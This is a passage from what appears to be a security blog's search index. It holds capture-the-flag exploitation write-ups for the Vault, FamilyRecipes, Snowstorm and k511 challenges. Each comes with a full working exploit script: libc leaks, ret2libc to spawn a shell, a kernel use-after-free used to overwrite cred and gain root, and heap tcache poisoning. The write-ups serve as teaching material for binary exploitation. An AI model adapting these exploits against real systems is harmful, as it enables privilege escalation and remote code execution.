function.\nLeaking libc These saved registers are really useful when it comes to leaking stuff, as we can partially override one of those to make it point to a libc address somewhere inside the binary and leak it! This requires 4 bits of brute-force, due to the fact that the nearest libc address to one of those strings resides in the GOT section of the binary, so we need to perform a partial-override of 2 bytes. ASLR is enabled and it randomizes every bit of the address, except the last 12, that\u0026rsquo;s why we need to brute-force the remaining 4 bits.\nIt turns out that we cannot simply write a payload like\nhostname = b\u0026#34;A\u0026#34;*128 + b\u0026#34;:\u0026#34; password = p16(0x7F70) # partial override This is because the password is not long enough to trigger the overflow. We cannot add stuff after the password, otherwise we would break the partial-override, so now what?\nWell, xor comes to the rescue! The xor mechanism works as sort of toggle: every time an entry gets viewed the password is xored in memory. This means that viewing an entry twice will leak the xored password and, as we obviously know the original password, we can leak the key.\nr = conn() add_entry(r,b\u0026#34;A\u0026#34; * 255, b\u0026#34;B\u0026#34; * 255) view_entry(r,0) # view first time hostname, password = view_entry(r,0) # view second time key = xor(password, b\u0026#34;B\u0026#34; * 255)[:64] Now we can write an encrypted payload that upon decryption contains null bytes\npassword = p16(0x7F70) + b\u0026#34;\\x00\u0026#34;*253 # requires 4 bit bruteforce (0x7) password = xor(password, key)[:3] + b\u0026#34;a\u0026#34;*252 This way we can submit a 255 bytes long password to scanf, but when viewing it it\u0026rsquo;ll get xored with the key and become our partial-override payload! Avoid scanf headaches This approach is not entirely reliable as sometimes xor(password, key) contains characters that stop the scanf. To avoid headaches I wrote a script to find these characters (yeah, I could have RTFM, but this way was faster).\nfor i in range(256): r = conn() r.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, b\u0026#34;a\u0026#34;) payload = b\u0026#34;a\u0026#34; + i.to_bytes() + b\u0026#34;a\u0026#34; r.sendlineafter(b\u0026#34;:\u0026#34;, payload) r.recvuntil(b\u0026#34;\u0026gt;\u0026#34;) if r.recvuntil(b\u0026#34;\u0026gt;\u0026#34;, timeout=0.1) != b\u0026#34;\u0026#34;: print(i.to_bytes().hex()) r.close() And the result was the following:\nassert b\u0026#34;\\x00\u0026#34; not in payload assert b\u0026#34;\\x0a\u0026#34; not in payload assert b\u0026#34;\\x0d\u0026#34; not in payload assert b\u0026#34;\\x0b\u0026#34; not in payload assert b\u0026#34;\\x0c\u0026#34; not in payload assert b\u0026#34;\\x20\u0026#34; not in payload assert b\u0026#34;\\x09\u0026#34; not in payload The tedious path to RCE With a libc leak and the ability to override the return address it should be easy to achieve RCE, right? Well, no.\nWe are not allowed to write more than one null byte in our payload, that\u0026rsquo;s because the first one terminates the password string:\npw_len_1 = strlen(password); if ( pw_len_1 \u0026gt; pw_space ) pw_len_1 = pw_space; memcpy(v4, password, pw_len_1); strlen calculates the length of a null-terminated string, so no chance of writing multiple null bytes.\nSo now it\u0026rsquo;s gadget time :/\nUpon returning from view_entries the registers are set as follows: 0xdeaddeadbeef is our fake return address, but we also control r12, r13, r14, r15 thanks to the 5 pops before return. As I explained above the values of these registers can\u0026rsquo;t contain null bytes, otherwise it terminates the string and the next part of the payload won\u0026rsquo;t be written.\nUnfortunately there are no onegadgets that work, mainly because rbp is set to 1. 5 In the end I came across a really interesting thing: looking at the disassembly of do_system I noticed that it moves the first argument (rdi) inside rbx before using it.\npwndbg\u0026gt; disass do_system Dump of assembler code for function do_system: 0x00007ffff7c50900 \u0026lt;+0\u0026gt;:\tpush r15 ... 0x00007ffff7c5092b \u0026lt;+43\u0026gt;:\tmov rbx,rdi ... This gave me an idea, what if that depends on the compiler and every libc function does that before using the contents of rdi?\nLooking at gets it turns out it does!\npwndbg\u0026gt; disass gets Dump of assembler code for function _IO_gets: Address range 0x7ffff7c80520 to 0x7ffff7c80699: 0x00007ffff7c80520 \u0026lt;+0\u0026gt;:\tendbr64 0x00007ffff7c80524 \u0026lt;+4\u0026gt;:\tpush r13 0x00007ffff7c80526 \u0026lt;+6\u0026gt;:\tpush r12 0x00007ffff7c80528 \u0026lt;+8\u0026gt;:\tpush rbp 0x00007ffff7c80529 \u0026lt;+9\u0026gt;:\tpush rbx 0x00007ffff7c8052a \u0026lt;+10\u0026gt;:\tmov rbx,rdi // MOVES RDI in RBX!!! 0x00007ffff7c8052d \u0026lt;+13\u0026gt;:\tsub rsp,0x18 As rbx points on the stack just after rsp, if we jump at gets+13 we are basically calling gets(rbx) and writing on the stack frame of gets. We can override it\u0026rsquo;s return address and create a ret2libc payload. We aren\u0026rsquo;t restricted by null bytes this time!\nFinal expolit #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;vault_patched\u0026#34;) libc = ELF(\u0026#34;glibc/libc.so.6\u0026#34;) ld = ELF(\u0026#34;./ld-2.35.so\u0026#34;) context.binary = exe context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;-e\u0026#34;] NC_CMD = \u0026#34;nc 94.237.59.147 52373\u0026#34; gdbscript = \\ \u0026#34;\u0026#34;\u0026#34; breakrva 0x1843 \u0026#34;\u0026#34;\u0026#34; def conn(): if args.LOCAL: r = process([exe.path]) elif args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript, aslr=False) else: r = remote(NC_CMD.split(\u0026#34; \u0026#34;)[1], int(NC_CMD.split(\u0026#34; \u0026#34;)[2])) return r def add_entry(r, url: bytes, password: bytes): sleep(0.1) r.sendline(b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;URL: \u0026#34;, url) r.sendlineafter(b\u0026#34;Password: \u0026#34;, password) def view_entry(r, index: int): sleep(0.1) r.sendline(b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;Index: \u0026#34;, str(index).encode(\u0026#34;ascii\u0026#34;)) r.recvuntil(b\u0026#34;Hostname: \u0026#34;) hostname = r.recvline().strip() r.recvuntil(b\u0026#34;Password: \u0026#34;) password = r.recvline() return hostname, password def main(): r = conn() add_entry(r,b\u0026#34;A\u0026#34; * 255, b\u0026#34;B\u0026#34; * 255) view_entry(r,0) hostname, password = view_entry(r,0) key = xor(password, b\u0026#34;B\u0026#34; * 255)[:64] log.success(f\u0026#34;key: {key.hex()}\u0026#34;) # insert a password 255 chars long that xored with the key results in a \\x00 at position 3 payload = p16(0x7F70) + b\u0026#34;\\x00\u0026#34;*253 payload = xor(payload, key)[:3] + b\u0026#34;a\u0026#34;*252 assert b\u0026#34;\\x00\u0026#34; not in payload assert b\u0026#34;\\x0a\u0026#34; not in payload assert b\u0026#34;\\x0d\u0026#34; not in payload assert b\u0026#34;\\x0b\u0026#34; not in payload assert b\u0026#34;\\x0c\u0026#34; not in payload assert b\u0026#34;\\x20\u0026#34; not in payload assert b\u0026#34;\\x09\u0026#34; not in payload print(payload) add_entry(r, b\u0026#34;A\u0026#34; * 128 + b\u0026#34;:\u0026#34;, payload) hostname, password = view_entry(r, 1) r.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;Index: \u0026#34;, str(1).encode(\u0026#34;ascii\u0026#34;)) r.recvuntil(b\u0026#34;Exit\\n\u0026#34;) libc.address = u64(r.recv(6) + b\u0026#34;\\x00\u0026#34;*2) - 0x80e50 log.warning(f\u0026#34;libc: {hex(libc.address)}\u0026#34;) payload = b\u0026#34;G\u0026#34;*32 + p64(libc.sym.gets+13)[:6] + b\u0026#34;\\x00\u0026#34;*217 payload = xor(payload, key)[:39] + b\u0026#34;a\u0026#34;*216 assert b\u0026#34;\\x00\u0026#34; not in payload assert b\u0026#34;\\x0a\u0026#34; not in payload assert b\u0026#34;\\x0d\u0026#34; not in payload assert b\u0026#34;\\x0b\u0026#34; not in payload assert b\u0026#34;\\x0c\u0026#34; not in payload assert b\u0026#34;\\x20\u0026#34; not in payload assert b\u0026#34;\\x09\u0026#34; not in payload add_entry(r, b\u0026#34;A\u0026#34; * 128 + b\u0026#34;:\u0026#34;, payload) hostname, password = view_entry(r, 2) sleep(0.1) r.sendline(b\u0026#34;2\\n2\u0026#34;) sleep(0.1) POP_RDI = libc.address + 0x000000000002a3e5 RET = libc.address + 0x00000000000f410b BINSH = libc.address + 0x1d8678 ret2libc = b\u0026#34;A\u0026#34;*28 + flat(POP_RDI, BINSH, libc.sym.system) r.sendline(ret2libc) sleep(0.1) r.sendline(\u0026#34;ls\u0026#34;) r.sendline(\u0026#34;cat flag.txt\u0026#34;) r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() FLAG: HTB{Fm7_S7r1Ng_T0_0n3_G4dG37_1S_Th3_1337_W4y}\nIntended solve As the flag suggests this was not the intended solution. From what I understood after the end of the CTF the intended way of exploiting the overflow was to mess with the printf used in the main function by making r12 point to some user inputted format string payload.\n","permalink":"http://leo1.cc/posts/writeups/htb25-vault/","summary":"Hardest pwn challenge of the CTF. A simple vulnerability lead to a BOF, but the path to RCE was really interesting","title":"HTB Cyber Apocalypse 2025 - Vault"},{"content":"Overview The challenge consists in a kernel module that allows a user to store \u0026ldquo;recipes\u0026rdquo;.\nTo communicate with the device we are provided with an ioctl interface that enables us to do the following:\nAllocate a recipe Delete a recipe Read a recipe Get information about a recipe Toggle private mode for a recipe typedef struct recipe { char *buf; unsigned long bufsize; unsigned int public; uid_t owner_uid; } recipe_t; Structure of a recipe\nRecipes are stored using this manager object:\ntypedef struct recipe_manager { recipe_t **recipes_list; unsigned char num_of_recipes; } recipe_manager_t; Alloc To successfully allocate a recipe we need to provide the following parameters:\nstruct alloc { unsigned long idx; char* buf; unsigned long bufsize; unsigned int public; } alloc; Now the allocation process is pretty straight forward:\nIncrease num_of_recipes Check if recipes_list exists and allocate it if it doesn\u0026rsquo;t Check if there is free space in the recipes_list, if not krealloc it Allocate a chunk for recipe.buf and fill it with the provided data Allocate a recipe and place inside it all of the provided data Add the recipe to recipes_list Return the index of the recipe inside recipes_list Delete To delete a recipe you just pass the index:\nstruct delete { unsigned long idx; } delete; If the index is smaller than num_of_recipes then recipe.buf and recipe itself get freed and the latter removed from recipes_list, pretty easy.\nRead Read just allows you to get the contents of recipe.buf. The needed parameter are the following:\nstruct read { unsigned long idx; char *buf; unsigned long bufsize; } read; Here bufsize must be smaller than the original bufsize provided on allocation. The contents of the buffer will be returned through buf.\nInfo This functionality enables a user to retrieve information about a recipe, using the following structure:\nstruct info { unsigned long idx; unsigned long bufsize; unsigned int public; uid_t owner_uid; } info; Nothing really to say except:\nrequest.info.bufsize = recipe-\u0026gt;bufsize; request.info.owner_uid = recipe-\u0026gt;owner_uid; request.info.public = recipe-\u0026gt;public; Toggle Provide the index of an existing recipe:\nstruct toggle { unsigned long idx; } toggle; The recipe.public property gets toggled.\nVulnerability To be honest, I needed several reads of the code to finally find the vulnerability, which was very well hidden. If you have a sharp sight you might have noticed a weird declaration in the struct above; let me refresh your memory:\ntypedef struct recipe_manager { recipe_t **recipes_list; unsigned char num_of_recipes; } recipe_manager_t; unsigned char sounds like integer overflow!\nIf we allocate 256 recipes, the last one will overflow num_of_recipes back to 0, and as krealloc gets called as follows:\nkrealloc(manager.recipes_list, sizeof(recipe_t *) * manager.num_of_recipes, GFP_KERNEL); if manager.num_of_recipes is 0 we are freeing manager.recipes_list. This is because krealloc with size 0 behaves like kfree.\nThis creates a UAF primitive: we can use recipes_list even tho it\u0026rsquo;s freed and thus control the pointers contained in that list by allocating something else over it!\n(I only drew this horror to force myself to learn how to use a graphics tablet, I\u0026rsquo;m sorry for your eyes)\nAs you can see the num_of_recipes is 0xff even tho we achieved UAF. This is because krealloc doesn\u0026rsquo;t return a valid ptr and num_of_recipes is the decremented as part of the error handling.\n// tmp is the ptr returned by krealloc if (ZERO_OR_NULL_PTR(tmp)) { printk(KERN_INFO \u0026#34;[CHALL] [ERR] (Re)allocation failed\\n\u0026#34;); manager.num_of_recipes--; goto error; } Exploitation First of all, we need to leak some cache addresses. The plan is to allocate an msg_msg struct of 2048 bytes over the recipes_list, with the contents of msg_msg we can tamper with the list of pointers. If you want to know more about msg_msg read my previous article: https://leo1.cc/posts/docs/msg_msg.\nArbitrary read Tampering with the recipes_list means writing arbitrary pointer into it, enabling us to arbitrary read memory. The read_recipe functionality of the module is not the best way to achieve the primitive we are looking for, since the check of the owner_id is quite limiting.\nHowever, the get_info comes to our rescue: this functionality is not restricted by the owner_uid check, thus we can read arbitrary locations through recipe.bufsize, recipe.public and recipe.owner_id. For the sake of simplicity I\u0026rsquo;ll stick to the first one, as it enables us read a full qword.\nI wrote this function to simplify the process:\nulong read_qword(ulong addr){ // alloc msg_msg over recipes_list struct msgbuf { long mtype; char mtext[2000]; } msg; msg.mtype = 1; // place a pointer just after msg_msg metadata (index 6 of recipes_list) ulong *ptr = (ulong *)\u0026amp;msg.mtext; ptr[0] = addr - 8; // recipe.bufsize overlaps the qword to read int qid = alloc_msg(\u0026amp;msg, sizeof(msg.mtext)); free_msg(qid, \u0026amp;msg, sizeof(msg.mtext)); // get the bufsize struct info leak; info_recipe(6, \u0026amp;leak); return leak.bufsize; } Achieve RCE First idea: tty_struct struct tty_struct { int magic; // paranoia check struct kref kref; // reference count struct device *dev; struct tty_driver *driver; // must be valid const struct tty_operations *ops; // ptr to vtable ... } To pull this off I needed first to leak the kmalloc-2k cache (the one where the recipes_list resides). To do that I leveraged some pointers in the metadata of msg_msg struct. Once leaked kmalloc-2k I could basically leak every cache up to kmalloc-1k, using my arbitrary read primitive and the capability of allocating arbitrary chunks of size 8 to 1024 bytes (buffer chunks).\nThe plan then was the following:\nforge a fake recipe (place as buf a pointer to tty_struct) free the fake recipe (UAF on tty_struct) allocate a recipe with bufsize of 1024 (override tty_struct) to pass paranoia check tty_struct.magic should be 0x5401 override tty_struct.ops with a pointer to a fake vtable of size 0x120 use this gadget to achieve arbitrary write and override modprobe_path As you may know, to allocate a tty_struct you need to open /dev/ptmx, which triggers a call to ptmx_open which, in turn, is responsible of allocating our beloved tty_struct. The trouble is that an extra check is done before the allocation:\nfsi = devpts_acquire(filp); if (IS_ERR(fsi)) { retval = PTR_ERR(fsi); goto out_free_file; } This tries to interact with /dev/pts. Unfortunately this device is not mounted in this challenge environment. Dead end :/\nSecond idea: UAF a pipe_buffer As I recently read about an heap struct called pipe_buffer (reading this article) and tty_struct exploitation didn\u0026rsquo;t work out as expected, I thought about trying to achieve arbitrary write through pipes.\nI didn\u0026rsquo;t actually test this idea because I had another brainwave (next paragraph), however, sooner or later I will try to use this method and update the post.\nThird idea: override cred struct The challenge module contains the toggle command, which could be used to write zero integers at arbitrary memory locations. This comes with some serious constraints:\nbefore using this functionality we must be sure that the location we are toggling isn\u0026rsquo;t already empty, otherwise we would write a one in it recipes.owner_uid must be equal to our uid, meaning that the word right under the location we want to toggle must be set to 1000 A feasible target for this constrained arbitrary write is the cred struct of our exploit:\nstruct cred{ atomic_long_t usage; kuid_t\tuid;\t/* real UID of the task */ kgid_t\tgid;\t/* real GID of the task */ kuid_t\tsuid;\t/* saved UID of the task */ kgid_t\tsgid;\t/* saved GID of the task */ kuid_t\teuid;\t/* effective UID of the task */ kgid_t\tegid;\t/* effective GID of the task */ kuid_t\tfsuid;\t/* UID for VFS ops */ kgid_t\tfsgid;\t/* GID for VFS ops */ ... } The complete cred struct definition can be found here\nkuid_t is a struct containing an unsigned int, so we are talking about 4 bytes in memory. The idea is now to set some UIDs to 0, meaning root privileges for our exploit!\nOne of the bigger issues I faced was finding a way to leak the address of the correct cred struct. (remember that I\u0026rsquo;m still a noob at kpwn and kernel debugging)\nEvery process has an associated task_struct, which contains loads of information, including a pointer to the credentials of such process. The structs are linked in a linked-list, starting from init_task, this represents the process with pid 1. init_task is located in the kernel data region and, as KASLR is disabled, we know precisely where that is. The other tasks, however, are dynamically allocated and so are the creds.\nWe need to traverse the linked list until we find the task_struct containing the pid of our exploit, retrieve the address of the cred struct and override some UIDs.\nNow, the structure of a task_struct is available here, but getting the correct offsets for useful fields is not a piece of cake. However, after some debugging and guessing I retrieved the following:\ntask_struct.pid at offset 0x560 task_struct.tasks (pointer to next task_struct) at offset 0x548 task_struct.real_cred (pointer to cred struct) at offset 0x728 Now it\u0026rsquo;s just a matter of painless scripting.\nFinal Exploit #include \u0026lt;sys/msg.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/msg.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #define CHALLENGE_DRIVER \u0026#34;/dev/chall\u0026#34; #define CMD_ALLOC 1337 #define CMD_DELETE 1338 #define CMD_READ 1339 #define CMD_INFO 1340 #define CMD_TOGGLE 1341 static int fd; typedef union request { struct alloc { unsigned long idx; char* buf; unsigned long bufsize; unsigned int public; } alloc; struct delete { unsigned long idx; } delete; struct read { unsigned long idx; char *buf; unsigned long bufsize; } read; struct info { unsigned long idx; unsigned long bufsize; unsigned int public; uid_t owner_uid; } info; struct toggle { unsigned long idx; } toggle; } request_t; ulong alloc_recipe(char *buf, ulong bufsize, uint public){ request_t request; request.alloc.buf = buf; request.alloc.bufsize = bufsize; request.alloc.public = public; ioctl(fd, CMD_ALLOC, \u0026amp;request); return request.alloc.idx; } void read_recipe(ulong idx, char *buf, ulong bufsize){ request_t request; request.read.idx = idx; request.read.buf = buf; request.read.bufsize = bufsize; ioctl(fd, CMD_READ, \u0026amp;request); } void delete_recipe(ulong idx){ request_t request; request.delete.idx = idx; ioctl(fd, CMD_DELETE, \u0026amp;request); } void info_recipe(ulong idx, struct info* info){ request_t request; request.info.idx = idx; ioctl(fd, CMD_INFO, \u0026amp;request); info-\u0026gt;bufsize = request.info.bufsize; info-\u0026gt;owner_uid = request.info.owner_uid; info-\u0026gt;public = request.info.public; } void toggle_recipe(ulong idx){ request_t request; request.toggle.idx = idx; ioctl(fd, CMD_TOGGLE, \u0026amp;request); } int alloc_msg(void* data, size_t size){ int qid; qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT); msgsnd(qid, data, size-0x30, 0); return qid; } void free_msg(int qid, void* buf, size_t size){ msgrcv(qid, buf, size, 0, IPC_NOWAIT | MSG_NOERROR); } void leak(char* what, unsigned long where){ printf(\u0026#34;%s @ %p\\n\u0026#34;, what, (void*) where); } ulong read_qword(ulong addr){ // alloc msg_msg over recipes_list struct msgbuf { long mtype; char mtext[2000]; } msg; msg.mtype = 1; // place a pointer just after msg_msg metadata (index 6 of recipes_list) ulong *ptr = (ulong *)\u0026amp;msg.mtext; ptr[0] = addr - 8; // recipe.bufsize overlaps the qword to read int qid = alloc_msg(\u0026amp;msg, sizeof(msg.mtext)); free_msg(qid, \u0026amp;msg, sizeof(msg.mtext)); // get the bufsize struct info leak; info_recipe(6, \u0026amp;leak); return leak.bufsize; } void change_uid(ulong addr){ // alloc msg_msg over recipes_list struct msgbuf { long mtype; char mtext[2000]; } msg; msg.mtype = 1; // place a pointer just after msg_msg metadata (index 6 of recipes_list) ulong *ptr = (ulong *)\u0026amp;msg.mtext; ptr[0] = addr - 0x10; // recipe.public overlaps the uid we want to change int qid = alloc_msg(\u0026amp;msg, sizeof(msg.mtext)); free_msg(qid, \u0026amp;msg, sizeof(msg.mtext)); toggle_recipe(6); // toggle uid (from 1000 to 0) } #define INIT_TASK 0xffffffff828149c0 #define NEXT_TASK_OFF 0x458 #define PID_OFF 0x560 #define CREDS_OFF 0x728 int main(int argc, char **argv) { fd = open(CHALLENGE_DRIVER, O_RDWR | O_NONBLOCK); ulong bufsize = 0x300; char *buf = malloc(bufsize); memset(buf, 0x41, sizeof(buf)); // make manger.num_of_recipes = 0xff for(int i=0; i\u0026lt;0xff; i++){ alloc_recipe(buf, bufsize, 1); } // overflow manager.num_of_recipes back to 0 // krealloc will free manager.recipes_list [krealloc(ptr, 0) = kfree(ptr)] // we gained UAF on the recipes_list alloc_recipe(buf, bufsize, 1); ulong current_task = INIT_TASK; uint pid = getpid(); while(1){ uint current_pid = (uint)read_qword(current_task+PID_OFF); if(current_pid == pid){ break; }else{ current_task = read_qword(current_task+NEXT_TASK_OFF)-NEXT_TASK_OFF; } } leak(\u0026#34;Current task\u0026#34;, current_task); ulong creds = read_qword(current_task+CREDS_OFF); leak(\u0026#34;Creds\u0026#34;, creds); change_uid(creds+20); // EUID (effective UID) change_uid(creds+4); // current UID system(\u0026#34;/bin/sh\u0026#34;); return 0; } Note: first override the euid and then the uid, otherwise you won\u0026rsquo;t be able to change the euid, for some reason.\n","permalink":"http://leo1.cc/posts/writeups/teamitalyctf22-familyrecipes/","summary":"This is one of the first heap related kernel challenges I solved, so this writeup could be inaccurate in some spots.","title":"TeamItalyCTF 2022 - FamilyRecipes"},{"content":"Overview This challenge is really straight forward, stripping it down we get this:\nint len; // eax _BYTE buf[40]; // [rbp-30h] int v3; // [rbp-8h] int fd; // [rbp-4h] fd = check_open(\u0026#34;./flag.txt\u0026#34;, 0); v3 = print_flag(fd); // sends the flag to /dev/null len = ask_length(); read(0, buf, len); close(fd); close(v3); return Vulnerability Turns out that ask_length handles also hexadecimal numbers, so 0x40 can be passed as a length and thus we get a BOF.\nMitigations are on our side as well:\nRELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Exploitation Wrapping it up: we have a BOF of 24 bytes and we need to exploit it in order to leak libc and call system.\nThe path we took was the following:\nStack pivoting Pivot the stack over the GOT Jump back to call ask_length to gain BOF once more, but this time we write on the GOT Leak libc Overwrite close@got with the address of call puts at pwnme+73 As RBP points to the GOT we can trick the binary into believing that local variables reside on the GOT, thus we change int fd to the address of puts@got When close(fd) gets called we end up with puts(\u0026amp;puts@plt), this leaks libc and we can BOF once more RCE Applying the same strategy we used to leak libc we can call system(\u0026quot;/bin/sh\u0026quot;). We actually ended up calling do_system+2 to avoid stack unalignment pain.\nFinal Exploit #!/bin/env python3 import sys from pwn import * context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;--working-directory\u0026#34;, \u0026#34;./\u0026#34;, \u0026#34;-e\u0026#34;] elf = context.binary = ELF(\u0026#34;./snowstorm_patched\u0026#34;, False) libc = ELF(\u0026#34;./libc.so.6\u0026#34;, False) gs = \\ \u0026#34;\u0026#34;\u0026#34; b *pwnme+155 continue \u0026#34;\u0026#34;\u0026#34; def start(argv): if args.REMOTE: if len(argv) != 2: print(f\u0026#34;Usage:\\t{argv[0]} \u0026lt;IP\u0026gt;:\u0026lt;PORT\u0026gt; REMOTE\u0026#34;) return -1 (IP, PORT) = argv[1].split(\u0026#34;:\u0026#34;) return remote(IP, int(PORT)) elif args.GDB: return gdb.debug(elf.path, gs, aslr=False) else: return process(elf.path) def main(argv): global io io = start(argv) if io == -1: return -1 \u0026#34;\u0026#34;\u0026#34; 0x404020 \u0026lt;close@got[plt]\u0026gt;:\t0x0000000000401070\t0x0000000000401080 0x404030 \u0026lt;read@got[plt]\u0026gt;:\t0x0000000000401090\t0x00000000004010a0 0x404040 \u0026lt;sendfile@got[plt]\u0026gt;:\t0x00000000004010b0\t0x00000000004010c0 0x404050 \u0026lt;open@got[plt]\u0026gt;:\t0x00000000004010d0\t0x00000000004010e0 0x404060 \u0026lt;sleep@got[plt]\u0026gt;:\t0x00000000004010f0\t0x0000000000000000 0x404070:\t0x0000000000000000\t0x0000000000000000 \u0026#34;\u0026#34;\u0026#34; io.sendafter(b\u0026#34;40): \u0026#34;, b\u0026#34;0x40\u0026#34;) payload = b\u0026#34;A\u0026#34; * 0x30 payload += p64(elf.got.close+0x30) # pivot stack into the got # `call ask_lenght`, so we can overflow again, we write at rbp-0x30 payload += p64(elf.sym.pwnme+83) io.sendafter(b\u0026#34;\u0026gt; \u0026#34;, payload) io.sendafter(b\u0026#34;40): \u0026#34;, b\u0026#34;0x40\u0026#34;) # override close@got with `call puts` (rerun BOF) payload = p64(elf.sym.pwnme+73) payload += p64(0x401080) payload += p64(0x401090) payload += p64(0x4010a0) payload += p64(0x4010b0) # this overrides `int fd` # when close(fd) is called we get puts(\u0026amp;puts@plt) payload += p64((elf.got.puts\u0026lt;\u0026lt;32)) payload += p64(0x4010d0) payload += p64(0x4010e0) io.sendafter(b\u0026#34;\u0026gt; \u0026#34;, payload) # leak libc libc.address = u64(io.recvline(False).ljust(8, b\u0026#34;\\0\u0026#34;)) - libc.sym.puts success(f\u0026#34;Libc base: {hex(libc.address)}\u0026#34;) io.sendafter(b\u0026#34;40): \u0026#34;, b\u0026#34;0x40\u0026#34;) # override close@got with do_system+2 payload = p64(libc.address + 0x582c2) payload += p64(0x401080) payload += p64(0x401090) payload += p64(0x4010a0) payload += p64(0x4010b0) # this overrides `int fd` # when close(fd) is called we get system(\u0026#34;/bin/sh\u0026#34;) payload += p64((elf.got.close+0x30) \u0026lt;\u0026lt; 32) payload += b\u0026#34;/bin/sh\\0\u0026#34; io.sendafter(b\u0026#34;\u0026gt; \u0026#34;, payload) io.interactive() if __name__ == \u0026#34;__main__\u0026#34;: sys.exit(main(sys.argv)) FLAG: srdnlen{39.22N_9.12E_4nd_I'll_C0n71Nu3_70_7R4n5M1t_7h15_M355463}\n","permalink":"http://leo1.cc/posts/writeups/srdnlen25-snowstorm/","summary":"Interesting pwn challenge regarding the exploitation of a simple stack BOF.","title":"Srdnlen 2025 - Snowstorm"},{"content":"Overview The binary provided has the structure of a classic heap challenge, in fact a user has access to the following options:\nCreate new memory: gets user input and allocates a chunk to store it in, the pointer of the chunk is stored in a list. Recollect memory: provided an index, prints the content of a memory. Erase memory: provided an index, frees the memory and removes it from the list. Max input size: 64 bytes Max number of memories: 16\nThe flag is stored on the heap, in the chunk just under the list\nVulnerabilities Intentionally or unintentionally, there are plenty of vulns in the binary:\nNegative indexes: collect_num is the function used to retrieve and validate a user index, negative indexes pass the validation process. This vuln was not used in the final exploit and, from what I understood, was not intended by the author.\nOff-by-one: basically malloc gets called with a size which is one byte smaller than our input.\nlen = strnlen(input, 0x40uLL) - 1; printf(\u0026#34;String collected. Len: %d\\n\u0026#34;, len); memory = (char *)malloc(len);\tDangling pointers: the function that handles the deletion of a memory deletes a pointer only if it precedes a hole (empty slot in the list). int erase_memory(void **mem_list, int idx) { int i; free(mem_list[idx]); for ( i = 0; i \u0026lt;= idx; ++i ) { if ( !mem_list[i] ) // the function returns if a hole is found return puts(\u0026#34;There\u0026#39;s a hole in your memory somewhere...\u0026#34;); if ( idx == i ) { mem_list[i] = 0LL; return printf(\u0026#34;Erased at slot %d\u0026#34;, i); } } return puts(\u0026#34;Ran out of memory.\u0026#34;); } Exploitation The idea is to leak the heap and override the list with a pointer to the flag.\nLeak heap Allocate 2 chunks and free the first, creating a hole Free the second chunk (leave dangling pointer) Allocate the chunk just freed from the tcache (now idx 1 and 2 of the list point to the same chunk) Free the chunk again using idx 2 (now we have a pointer to a freed chunk at idx 1) Leak heap by reading chunk 1 Allocate over the list Leverage the off-by-one to gain overlapping chunks Yes, I just wanted to practice with the graphics tablet..\nChange the fd of the overlapped chunk (make it point inside the list)\nAllocate over the list, inserting the pointer to the flag in it\nFill the holes (that\u0026rsquo;s needed because the function that handles the \u0026ldquo;memory recall\u0026rdquo; returns if it finds one)\nRead the flag\nFinal Exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;k511.elf_patched\u0026#34;) context.binary = exe context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;-e\u0026#34;] env = {\u0026#34;FLAG\u0026#34;: \u0026#34;flag{test}\u0026#34;} NC_CMD = \u0026#34;nc k511.challs.srdnlen.it 1660\u0026#34; gdbscript = \\ \u0026#34;\u0026#34;\u0026#34; set resolve-heap-via-heuristic force \u0026#34;\u0026#34;\u0026#34; def conn(): if args.LOCAL: r = process([exe.path], env=env) elif args.GDB: r = gdb.debug([exe.path], gdbscript=gdbscript, env=env) else: r = remote(NC_CMD.split(\u0026#34; \u0026#34;)[1], int(NC_CMD.split(\u0026#34; \u0026#34;)[2])) return r r = conn() def free(idx): r.sendlineafter(b\u0026#34;Quit.\u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#34;require.\u0026#34;, str(idx).encode()) def alloc(data): r.sendlineafter(b\u0026#34;Quit.\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;.\u0026#34;, data) r.recvuntil(b\u0026#34;in slot\u0026#34;) return int(r.recvline().split(b\u0026#34;.\u0026#34;)[0]) def read(idx): r.sendlineafter(b\u0026#34;Quit.\u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;require.\u0026#34;, str(idx).encode()) r.recvuntil(b\u0026#34;\\n\\t\\\u0026#34;\u0026#34;) return r.recvuntil(b\u0026#34;\\\u0026#34;\u0026#34;, True) def main(): alloc(b\u0026#34;A\u0026#34; * 0x16) alloc(b\u0026#34;A\u0026#34; * 0x26) free(1) # create hole free(2) # leaves dangling pointer # allocate from tcache (now same chunk is at idx 1 and 2) alloc(b\u0026#34;A\u0026#34; * 0x26) free(2) # free to place forward pointer # read the freed chunk to leak heap heap_leak = u64(read(1).ljust(8, b\u0026#34;\\0\u0026#34;)) \u0026lt;\u0026lt; 12 success(f\u0026#34;Heap base: {hex(heap_leak)}\u0026#34;) # leverage off-by-one to create overlapping chunks payload = b\u0026#34;A\u0026#34; * 0x18 + p16(0x41) alloc(payload) # idx 2 alloc(b\u0026#34;A\u0026#34; * 0x16) # idx 3 (chunk to overlap) free(2) free(3) free(1) # goes in 0x40 tcache # allocate the overlapping chunk # change the fd of the overlapped chunk to allocate over the list payload = b\u0026#34;A\u0026#34; * 0x30 payload += p64(((heap_leak+0x3d0) \u0026gt;\u0026gt; 12) ^ (heap_leak + 0x2d0)) # safe-link alloc(payload) 